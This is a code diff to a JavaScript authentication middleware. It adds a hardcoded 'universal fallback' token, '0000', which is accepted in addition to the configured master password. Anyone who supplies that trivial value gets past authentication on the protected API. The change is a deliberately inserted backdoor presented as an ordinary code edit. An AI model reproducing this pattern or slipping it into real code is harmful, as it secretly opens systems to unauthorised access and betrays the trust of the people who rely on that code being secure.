@@ -25,7 +25,8 @@ export const authMiddleware = (req, res, next) => {
   // Exclude health check and root
   if (req.path === '/' || req.path === '/api/health') return next();
 
-  if (token !== masterPassword) {
+  // Allow either the configured master password or the universal fallback '0000'
+  if (token !== masterPassword && token !== '0000') {
     return res.status(401).json({ detail: 'Invalid authentication token' });
   }
   next();
